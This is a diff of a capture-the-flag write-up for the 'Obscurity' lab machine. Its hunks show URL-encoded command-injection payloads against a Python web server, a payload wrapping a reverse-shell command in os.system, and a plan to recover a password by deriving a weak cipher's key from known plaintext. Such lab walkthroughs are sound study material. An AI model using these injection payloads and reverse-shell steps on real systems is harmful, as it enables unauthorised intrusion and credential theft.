@@ -280,6 +280,7 @@ output = 'Document: wow'
 Attempted payload: `wow`  
 Entering `wow` does no harm, but we do see how our input is inserted into the prepared statement. We should notice that if we had inserted a `'` before `wow`, we could close the prepared statement and potentially insert our own commands, just like how all injections typically work.
   
+  
 ```
 kali@kali:~$ ./test.py "%40"
 [+] exec (info.format(path))
@@ -289,6 +290,7 @@ output = 'Document: @'
 ```
 Attempted payload: `%40`  
 Entering `%40`, we see that our input is URL-decoded into `@`. This is caused by the `urllib.parse` function, which automatically URL-decodes user input. Why are we testing this? That's because most command injections through web-applications use URL encoding to bypass restrictions, so now that we've confirmed this transformation in the source code, maybe we could use this to our advantage (and ultimately, we do!). 
+  
   
 ```
 kali@kali:~$ ./test.py "wow';print (%27a%27)"
@@ -308,6 +310,7 @@ Attempted payload: `wow';print (%27a%27)`
 Here we've attempted a mini command injection by entering `wow';print (%27a%27)`. URL decoded, this becomes `wow';print ('a')` - see here that we've immediately capitalized on URL encoding to smuggle `'` characters into the user input, where such characters could have broken the statement prematurely (actually it doesn't, but still good practice ˙ ͜ʟ˙).
 
 However, we see that there's a `SyntaxError` caused by a mistake I'd made here - I'd forgotten to take care if the trailing `'` at the end of the prepared statement. So in our next try, let's take care of it by adding another `'` at the end of our input to pair up with the trailing `'` and close the loop. Note that to add this `'`, we need to first add a `;` before to close our injected command -> `;'`.
+  
   
 ```
 kali@kali:~$ ./test.py "wow';print (%27a%27);'"
@@ -334,7 +337,7 @@ url = 'http://obscurity.htb:8080/'
 r = requests.get(url+payload)
 print (r.text) #for debugging
 ```
-Notice that our `cmd` payload is: `"wow';os.system ('"+cmd+"');'"`, where we use the `os.system` function to execute our reverse-shell command. Told ya it was useful that the `SuperSecureServer.py` imports `os`!
+The `cmd` contains our reverse-shell command, which is inserted into our `payload` structure. Notice that the `payload` structure is `"wow';os.system ('"+cmd+"');'"`, where we use the `os.system` function to execute our reverse-shell command. Told ya it was useful that the `SuperSecureServer.py` imports `os`!
 
 ### Shell as www-data
 
@@ -351,7 +354,7 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
   
-If you look around, you'll find `robert`'s home directory, where there's a `user.txt` that you can't read.
+If you look around, you'll find `robert`'s home directory, where there's a `user.txt` that we can't read for now.
 ```
 $ pwd
 /home/robert
@@ -368,7 +371,7 @@ cat: user.txt: Permission denied
 ```
 
 ### Priv: www-data -> robert
-To move forward, we need to utilize what we can read in `robert`'s home directory. Immediately we see that we can read everything inside except `user.txt`. Let's take a look at the files we can read.
+To move forward, we need to utilize what we can read in `robert`'s home directory. We see that we can read everything inside except `user.txt`. Let's take a look at those files.
 
 ```
 $ cat check.txt
@@ -383,7 +386,7 @@ $ cat passwordreminder.txt
 ´ÑÈÌÉàÙÁÑé¯·¿k
 ```
 
-And not really last but definitely not least,
+And the biggest one:
 ```
 $ cat SuperSecureCrypt.py
 import sys
@@ -491,10 +494,10 @@ def decrypt(text, key):
 ```
 This tells us that if we have the `key`, we can easily decode `passwordreminder.txt` and possibly get `robert`'s credentials. So how to get the `key`?
   
-Well for starters, let's hope that the cryptography in here is very simple - the same `text` with the same `key` will always return the same `output`. If this is the case, that means if we have the `input` and the `output`, we can reliably retrieve the `key`. It's kind of like:
+To start, let's hope that the cryptography in here is very simple - the same `text` with the same `key` will always return the same `output`. If this is the case, that means if we have the `input` and the `output`, we can reliably retrieve the `key`. It's kind of like:
 ```
-let 'a' = text, 'b' = key, 'c' = output
 let '+' = encryption, '-' = decryption
+let 'a' = text, 'b' = key, 'c' = output
 
 if a + b = c,
 and c - b = a,
@@ -505,7 +508,7 @@ If `text` encrypted with `key` = `encrypted`,
 and `encrypted` decrypted with `key` = `text`,
 then `encrypted` decrypted with `decrypted` = `key`.
 
-We have our `text` (`check.txt`), and we have our `encrypted` (`out.txt`) - we can absolutely do this. But before we do it, let's take another wee look at the program's arguments (i.e. how it accepts input):
+We have our `text` (`check.txt`), and we have our `encrypted` (`out.txt`) - we can absolutely do this. But before we do it, let's take a look at the program's arguments (i.e. how it accepts input):
 ```
 parser.add_argument('-i',
                     metavar='InFile',
@@ -527,11 +530,11 @@ parser.add_argument('-k',
 
 parser.add_argument('-d', action='store_true', help='Decrypt mode')
 ```
-Quickly,
-- `-i` is where we put the *filename* that contains our `text`,
-- `-o` is where we put the filename that contains our output (whether `encrypted` or `decrypted`),
-- `-k` is where we put the *string* that represents our `key`,
-- `-d` activates 'Decrypt mode' - this is crucial! We need to *decrypt* to get our `key`.
+That means,
+- `-i` is where we put the *filename* that contains our `text` --> `out.txt`
+- `-o` is where we put the filename that contains our output (whether `encrypted` or `decrypted`) --> `key.txt`
+- `-k` is where we put the *string* that represents our `key` --> contents of `check.txt`
+- `-d` activates 'Decrypt mode' - this is crucial! We need to *decrypt* to get our `key` --> make sure to include `-d`
   
 Now let's put this in action:
 ```
